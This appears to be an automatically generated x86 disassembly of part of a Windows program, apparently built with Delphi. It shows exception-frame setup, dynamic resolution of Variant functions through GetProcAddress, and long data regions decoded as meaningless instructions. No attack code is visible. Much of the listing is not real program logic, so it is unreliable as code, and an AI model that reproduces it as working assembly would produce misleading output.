mov dl 0x48
add [ edx + eax * 8 + 0x48 ] al
add ah dh
mov dl 0x48
add [ eax - 0x13ffb740 ] bl
mov dl 0x48
add [ eax - 0x1bffb73d ] cl
mov dl 0x48
add al al
retn
add [ edx + esi * 4 - 0x3d37ffb8 ] bh
dec eax
add [ edx + esi * 4 - 0x3dffffb8 ] dh
dec eax
add [ edx + esi * 4 - 0x3df7ffb8 ] ch
dec eax
add [ edx + esi * 4 - 0x3bbfffb8 ] ah
dec eax
add [ edx + esi * 4 - 0x3dfbffb8 ] bl
dec eax
add [ edx + esi * 4 - 0x3b43ffb8 ] dl
dec eax
add [ edx + esi * 4 - 0x3cf3ffb8 ] cl
dec eax
add [ edx + esi * 4 - 0x3d1bffb8 ] al
dec eax
add [ edx + esi * 4 + 0x48 ] bh
add al dl
les ecx [ eax ]
je r-xdata
dec eax
sub_40d510
mov dl 0x48
add [ eax - 0x3c ] cl
dec eax
add [ edx + esi * 4 + 0x48 ] bl
add [ esp + eax * 8 + 0x48 ] dl
add [ edx + esi * 4 + 0x48 ] dl
add [ ecx + eax * 8 + 0x48 ] cl
add [ edx + esi * 4 + 0x48 ] cl
add [ eax ] al
ror [ eax ] 0x44
mov dl 0x48
add al ah
retn 0x48
sub_40d538
cmp al 0xb2
dec eax
add [ ebx + eax * 8 + 0x48 ] bh
add [ edx + esi * 4 ] dh
dec eax
add [ eax - 0x40 ] dl
dec eax
add [ edx + esi * 4 ] ch
dec eax
add [ esp + eax * 8 ] bh
dec eax
add [ edx + esi * 4 ] ah
dec eax
add [ edx + eax * 8 ] dl
dec eax
add [ eax ] ch
add [ eax ] al
add [ edx + esi * 4 ] bl
dec eax
add [ eax ] ah
les ecx [ eax ]
add [ eax ] al
add [ eax ] al
sbb [ edx - 0x3f5bffb8 ] dh
dec eax
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 ] dl
dec eax
add [ ebx + eax * 8 + 0x48 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] dl
mov dl 0x48
add [ eax + eax * 8 + 0x48 ] bl
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 ] cl
dec eax
add [ eax ] ah
ror [ eax ] 0x0
add [ eax ] al
add [ eax ] cl
mov dl 0x48
add [ eax ] bl
ror [ eax ] 0x0
add [ eax ] al
add [ edx + esi * 4 ] al
dec eax
add [ eax + eax * 8 + 0x48 ] bh
add [ eax ] al
add [ edx - 0x3defffb8 ] dh
dec eax
add [ eax ] al
add [ eax ] al
add ah bh
mov cl 0x48
add [ eax ] cl
retn
sub_40d5c2
dec eax
add [ eax ] al
add [ eax ] al
add al bh
mov cl 0x48
add [ ecx + eax * 8 ] bl
dec eax
add [ eax ] al
add [ eax ] al
add ah dh
mov cl 0x48
add al bl
retn 0x48
sub_40d5e1
mov cl 0x48
add [ ebx + eax * 8 + 0x48 ] bh
add [ eax ] al
in al dx
mov cl 0x48
add [ eax + 0x48c3 ] ch
add [ eax ] al
add al ch
mov cl 0x48
add [ ebx + eax * 8 ] ah
dec eax
add [ eax ] al
add [ eax ] al
add ah ah
mov cl 0x48
add ah bh
ror [ eax ] 0x0
add [ eax ] al
add al ah
mov cl 0x48
add [ ecx + eax * 8 + 0x48 ] bl
add [ eax ] al
fdiv [ ecx - 0x3fa7ffb8 ]
dec eax
add [ eax ] al
add [ eax ] al
add al bl
mov cl 0x48
add [ ebx + eax * 8 + 0x48 ] ah
add [ eax ] al
aam 0xb1
dec eax
add [ edx + eax * 8 + 0x48 ] ah
add [ eax ] al
shl [ ecx - 0x3e77ffb8 ] 0x1
dec eax
add [ eax ] al
add [ eax ] al
add ah cl
mov cl 0x48
add [ eax - 0x3e ] bh
dec eax
add [ eax ] al
add [ eax ] al
add al cl
mov cl 0x48
add al dh
retn 0x48
sub_40d660
add [ eax ] al
add [ eax ] al
les esi [ ecx - 0x3d73ffb8 ]
dec eax
add [ eax ] al
add [ eax ] al
add al al
mov cl 0x48
add ah cl
ror [ eax ] 0x0
add [ eax ] al
add [ ecx + esi * 4 - 0x3fabffb8 ] bh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x380048b1 ] bh
retn 0x48
sub_40d690
add [ eax ] al
add [ eax ] al
mov ah 0xb1
dec eax
add [ esp + eax * 8 + 0x48 ] bl
add [ eax ] al
add [ eax ] al
add [ eax + 0x80048b1 ] dh
les ecx [ eax ]
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
mov cl 0x48
add ah dl
retn 0x48
sub_40d6b4
add [ eax ] al
add [ eax ] al
test al 0xb1
dec eax
add [ eax - 0x3f ] cl
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 4 - 0x3f97ffb8 ] ah
dec eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xfffb74f ] ah
retn
sub_40d72c
add [ eax ] al
add [ eax ] al
pushad
mov cl 0x48
add [ ecx + eax * 8 + 0x48 ] dl
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_40d8b1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8b8
retn
mov eax rw-data
call sub_40d31c
call sub_40ce88
call sub_40bf3c
mov eax rw-data
mov ecx 0x16
mov edx [ sub_40ba14 ]
call sub_40496c
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_40496c
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_40496c
mov eax rw-data
call sub_403eb8
mov eax rw-data
mov edx [ r-xdata ]
call sub_4050d4
mov eax rw-data
mov edx [ r-xdata ]
call sub_4050d4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_40496c
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_40496c
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_40496c
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_40496c
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_40496c
mov eax rw-data
call sub_403eb8
mov eax rw-data
call sub_403eb8
mov eax rw-data
call sub_403eb8
mov eax rw-data
call sub_403eb8
mov eax rw-data
call sub_403eb8
mov eax rw-data
call sub_403eb8
mov eax rw-data
call sub_403eb8
mov eax rw-data
call sub_403eb8
mov eax rw-data
call sub_4045c4
mov eax rw-data
call sub_403eb8
sub_40d8bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d924
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d92b
retn
mov eax sub_40d46c
call sub_403c64
mov eax r-xdata
call sub_403c8c
cmp [ rw-data ] 0x0
je r-xdata
call sub_40beb8
call sub_40bfbc
call sub_40cea8
call sub_40c90c
mov eax rw-data
mov edx r-xdata
call sub_403f0c
sub_40d95c
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d9b0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40da0a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404140
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_408238
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da11
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40da1c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40da76
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404140
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40971c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da7d
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40da88
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dae2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404140
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4096f0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dae9
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40daf4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40db4e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404140
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40af68
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db55
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40db60
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dbba
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404140
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409748
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dbc1
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40dbcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40dc39
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404140
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_408344
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc40
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
sub_40dc4c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dcac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4096a4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404710
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dcb3
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40dcbc
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dd1c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a6f4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404710
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd23
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40dd2c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dd90
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_4083e0
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_404710
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd97
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_40ddc0
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40ddec
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d95c
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d98c
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d98c
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d998
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d998
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d998
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d998
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d998
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d998
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d998
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d998
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d998
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d9a4
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d9b0
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da1c
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da88
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40daf4
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db60
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbcc
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dc4c
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dcbc
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd2c
mov eax r-xdata
call sub_40ddc0
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40e0f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e11d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e124
retn
sub_40e258
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc0040e2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1d ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
les edi [ eax + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x70795474
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
push ss
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
jecxz r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
jo r-xdata
popad
outsb
je r-xdata
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
les edi [ eax + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc ecx
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
outsd
jb r-xdata
popad
jae r-xdata
inc ebx
add [ eax + 0x33 ] bh
outsb
jbe r-xdata
xor eax [ eax ]
xor [ ebx ] 0x40
add [ ebx + esi + 0x33780040 ] al
in al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
in al 0x40
inc eax
outsd
jb r-xdata
inc ebp
jb r-xdata
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
pop ss
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
shr [ eax - 0x1d ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
dec ecx
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0xc0040 ] dl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
pop ss
inc ebp
push esi
popad
jb r-xdata
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
jb r-xdata
in al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les edi [ eax + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
in al 0x40
add [ eax + eax ] cl
outsd
add [ eax + eax ] cl
add [ eax ] al
les edi [ eax + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ah ah
inc eax
outsd
jb r-xdata
int3
inc ebx
popad
jb r-xdata
add al 0xe3
inc eax
add [ eax ] al
add [ eax ] al
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
jb r-xdata
outsb
js r-xdata
xor [ ebx ] 0x40
add [ ebx + esi + 0x33780040 ] al
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
jns r-xdata
add [ eax + 0x33 ] bh
outsb
jbe r-xdata
popad
outsb
je r-xdata
ror ah 0xe3
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
popad
outsb
je r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
in eax 0x40
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
les edi [ eax + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1b ] ah
inc eax
inc eax
in al 0x40
add [ eax + eax ] cl
add [ eax ] al
les edi [ eax + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
inc eax
add [ eax ] bl
xor [ eax ] eax
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
les edi [ eax + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xe3
add [ eax ] al
add ah al
js r-xdata
add [ eax ] al
lea eax [ eax ]
mov al [ 0x40e2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e2 ] ah
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
jb r-xdata
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
in eax 0x40
add [ eax + eax ] cl
add [ eax ] al
les edi [ eax + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
inc eax
sar al 0xe4
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
les edi [ eax + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
adc al 0x45
push esi
popad
jb r-xdata
inc eax
add [ esi ] ch
inc eax
add [ eax ] al
add [ eax ] al
popad
jb r-xdata
popad
jns r-xdata
outsb
je r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0xc0040 ] dl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
sbb [ ebp + 0x56 ] al
je r-xdata
popad
inc eax
add [ ebx + esi + 0x33780040 ] al
jb r-xdata
add [ eax ] al
jb r-xdata
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
popad
jb r-xdata
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ eax ] bl
inc ebp
push esi
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
out 0x40 al
add [ eax + eax ] cl
add [ eax ] al
les edi [ eax + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
pop ss
outsb
je r-xdata
popad
outsb
je r-xdata
inc ebp
push esi
popad
jb r-xdata
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ edi ] dl
dec bp
insd
outsd
jb r-xdata
jo r-xdata
popad
je r-xdata
inc eax
add al cl
in eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
insd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x40 ] bl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
jae r-xdata
popad
add [ eax ] bl
xor [ eax ] eax
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
xor eax [ eax ]
jne r-xdata
inc ebp
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ eax - 0x1b ] ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x0
xor eax eax
push ebp
push sub_40e7c2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
xor eax eax
pop edx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
jbe r-xdata
je r-xdata
outsd
jb r-xdata
popad
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ gs : ebp + 0x64 ] si
inc ebp
clc
dec edi
add [ eax ] al
add [ eax ] al
outsd
je r-xdata
add [ eax ] al
les edi [ eax + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add [ esi + 0x40 ] dl
add [ eax ] al
add [ eax ] al
